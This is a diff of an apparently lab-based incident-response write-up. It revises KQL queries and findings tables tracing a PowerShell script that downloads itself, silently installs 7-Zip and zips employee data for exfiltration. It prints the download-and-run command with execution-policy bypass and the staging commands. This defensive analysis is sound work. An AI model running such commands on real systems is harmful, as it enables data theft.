@@ -22,10 +22,6 @@ DeviceProcessEvents
 | order by TimeGenerated
 ```
 
-![_ir1](https://github.com/user-attachments/assets/0dc71ac4-95cb-4315-8ea2-36cbcc96caea)
-
-
-
 This query detected the following suspicious command:
 ```powershell
 powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1
@@ -37,84 +33,68 @@ The command indicated that a PowerShell script (`exfiltratedata.ps1`) was downlo
 
 I contacted the user of `ir-win10` to gather additional context. The user mentioned they attempted to install something, observed a black screen, and stated "nothing happened afterward." This information suggested the possibility of a malicious script being executed without their knowledge.
 
-### Query 1: Process Events
+### Process Events Analysis
 
-To confirm whether the downloaded script was executed, I queried process events:
+To confirm the downloaded script's execution and identify further malicious activities, I queried process events:
 ```kql
 DeviceProcessEvents
 | where DeviceName == "ir-win10"
-| where InitiatingProcessCommandLine contains "exfiltratedata.ps1"
 | project Timestamp, FileName, FolderPath, ProcessCommandLine
+| order by Timestamp
 ```
-![_ir2](https://github.com/user-attachments/assets/8c377af9-291d-4c76-b71f-cf8ed5f9e37a)
-
-
 **Findings:**
-| Timestamp          | FileName         | FolderPath                                  | ProcessCommandLine                                        |
-|--------------------|------------------|--------------------------------------------|---------------------------------------------------------|
-| 8 Jan 2025 18:48:38 | powershell.exe  | C:\Windows\System32\WindowsPowerShell\v1.0\ | powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1 |
 
-This confirmed the script was executed shortly after it was downloaded. 
+**Note:** The placeholder `[TIMESTAMP]` represents generalized timestamps for repeated events. Refer to the screenshots for actual logs.
+| Timestamps                     | FileName         | FolderPath                                  | ProcessCommandLine                                        |
+|--------------------------------|------------------|--------------------------------------------|---------------------------------------------------------|
+| 8 Jan 2025 20:48:43, 19:48:40, 18:48:47 | 7z.exe           | C:\Program Files\7-Zip\                   | "7z.exe" a C:\ProgramData\employee-data-[TIMESTAMP].zip C:\ProgramData\employee-data-temp[TIMESTAMP].csv |
+| 8 Jan 2025 20:48:37, 19:48:32, 18:48:40 | 7z2408-x64.exe   | C:\ProgramData\                           | "7z2408-x64.exe" /S                                    |
+| 8 Jan 2025 20:48:35, 19:48:31, 18:48:38 | powershell.exe  | C:\Windows\System32\WindowsPowerShell\v1.0\ | powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1 |
+| 8 Jan 2025 20:48:31, 19:48:27, 18:48:35 | powershell.exe  | C:\Windows\System32\WindowsPowerShell\v1.0\ | powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1 |
 
-### Query 2: Repeat Execution Detected
+These logs confirmed the following sequence of events:
+1. The script `exfiltratedata.ps1` was downloaded and executed multiple times.
+2. The script installed 7-Zip silently using `7z2408-x64.exe`.
+3. The installed 7-Zip (`7z.exe`) was used to compress sensitive data into ZIP files.
 
-To investigate further, I re-ran the query to check for subsequent activity involving the same script. A second execution was detected:
+This strongly indicated malicious intent to exfiltrate sensitive information.
 
-![_ir3](https://github.com/user-attachments/assets/81af8306-52d5-4e37-ac87-e1066ea1958e)
+### Network Events Analysis
 
-
-| Timestamp          | FileName         | FolderPath                                  | ProcessCommandLine                                        |
-|--------------------|------------------|--------------------------------------------|---------------------------------------------------------|
-| 8 Jan 2025 19:48:27 | powershell.exe  | C:\Windows\System32\WindowsPowerShell\v1.0\ | powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1 |
-
-This indicated ongoing malicious activity and elevated the incident to a live attack scenario.
-
-### Query 3: Network Events
-
-I analyzed network events to identify any potential data exfiltration:
+To identify any potential data exfiltration, I queried network events:
 ```kql
 DeviceNetworkEvents
 | where DeviceName == "ir-win10"
-| where InitiatingProcessCommandLine contains "exfiltratedata.ps1"
 | project Timestamp, ActionType, RemoteIP, RemotePort, RemoteUrl, InitiatingProcessCommandLine
 | order by Timestamp
 ```
-![_ir4](https://github.com/user-attachments/assets/1832d285-87de-4539-a3a4-a853e4018ab2)
-
-
 **Findings:**
 | Timestamp          | ActionType       | RemoteIP          | RemotePort | RemoteUrl                                      | CommandLine                                           |
 |--------------------|------------------|-------------------|------------|------------------------------------------------|-----------------------------------------------------|
-| 8 Jan 2025 18:48:35 | ConnectionSuccess | 185.199.109.133   | 443        | https://raw.githubusercontent.com              | powershell.exe -ExecutionPolicy Bypass -Command ... |
+| 8 Jan 2025 18:48:47 | ConnectionSuccess | 20.60.133.132     | 443        | https://sacyberrangedanger.blob.core.windows.net | powershell.exe -ExecutionPolicy Bypass -File ...    |
 | 8 Jan 2025 18:48:39 | ConnectionSuccess | 20.60.181.193     | 443        | https://sacyberrange00.blob.core.windows.net    | powershell.exe -ExecutionPolicy Bypass -File ...    |
-| 8 Jan 2025 19:48:47 | ConnectionSuccess | 20.60.133.132     | 443        | https://sacyberrangedanger.blob.core.windows.net| powershell.exe -ExecutionPolicy Bypass -File ...    |
+| 8 Jan 2025 18:48:35 | ConnectionSuccess | 185.199.109.133   | 443        | https://raw.githubusercontent.com              | powershell.exe -ExecutionPolicy Bypass -Command ... |
 
-The findings showed active connections to potentially malicious endpoints, further substantiating the threat.
+These logs showed repeated connections to external endpoints, strongly supporting the hypothesis of data exfiltration.
 
-### Query 4: File Events
+### File Events Analysis
 
-To identify artifacts, I queried file events:
+To identify artifacts related to data staging or exfiltration, I queried file events:
 ```kql
 DeviceFileEvents
 | where DeviceName == "ir-win10"
-| where FileName endswith ".zip"
 | project Timestamp, FileName, FolderPath, InitiatingProcessCommandLine, ActionType
 | order by Timestamp desc
 ```
-![_ir5](https://github.com/user-attachments/assets/ef546c84-dab4-4d97-8680-02376498574f)
-
-
 **Findings:**
-| Timestamp          | FileName                     | FolderPath                             | InitiatingProcessCommandLine                                          | ActionType |
-|--------------------|------------------------------|----------------------------------------|------------------------------------------------------------------------|------------|
-| 8 Jan 2025 20:48:44 | employee-data-20250108074836.zip | C:\ProgramData\backup\employee-data-20250108074836.zip | powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1 | FileRenamed |
-| 8 Jan 2025 19:48:41 | employee-data-20250108064831.zip | C:\ProgramData\backup\employee-data-20250108064831.zip | powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1 | FileRenamed |
-| 8 Jan 2025 18:48:47 | employee-data-20250108054839.zip | C:\ProgramData\backup\employee-data-20250108054839.zip | powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1 | FileRenamed |
-| 8 Jan 2025 20:48:43 | employee-data-20250108074836.zip | C:\ProgramData\employee-data-20250108074836.zip        | """7z.exe"" a C:\ProgramData\employee-data-20250108074836.zip C:\ProgramData\employee-data-temp20250108074836.csv" | FileCreated |
-| 8 Jan 2025 19:48:40 | employee-data-20250108064831.zip | C:\ProgramData\employee-data-20250108064831.zip        | """7z.exe"" a C:\ProgramData\employee-data-20250108064831.zip C:\ProgramData\employee-data-temp20250108064831.csv" | FileCreated |
-| 8 Jan 2025 18:48:47 | employee-data-20250108054839.zip | C:\ProgramData\employee-data-20250108054839.zip        | """7z.exe"" a C:\ProgramData\employee-data-20250108054839.zip C:\ProgramData\employee-data-temp20250108054839.csv" | FileCreated |
 
-The repeated file creation and renaming strongly suggested data staging and preparation for exfiltration.
+**Note:** The placeholder `[TIMESTAMP]` represents generalized timestamps for repeated events. Refer to the screenshots for actual logs.
+| Timestamps             | FileName                     | FolderPath                             | InitiatingProcessCommandLine                                          | ActionType |
+|--------------------------------|------------------------------|----------------------------------------|------------------------------------------------------------------------|------------|
+| 8 Jan 2025 20:48:44, 19:48:41, 18:48:47 | employee-data-[TIMESTAMP].zip | C:\ProgramData\backup\employee-data-[TIMESTAMP].zip | powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1 | FileRenamed |
+| 8 Jan 2025 20:48:43, 19:48:40, 18:48:47 | employee-data-[TIMESTAMP].zip | C:\ProgramData\employee-data-[TIMESTAMP].zip        | "7z.exe" a C:\ProgramData\employee-data-[TIMESTAMP].zip C:\ProgramData\employee-data-temp[TIMESTAMP].csv | FileCreated |
+
+These findings confirmed the repeated creation and renaming of ZIP files, consistent with attempts to stage data for exfiltration.
 
 ---
 
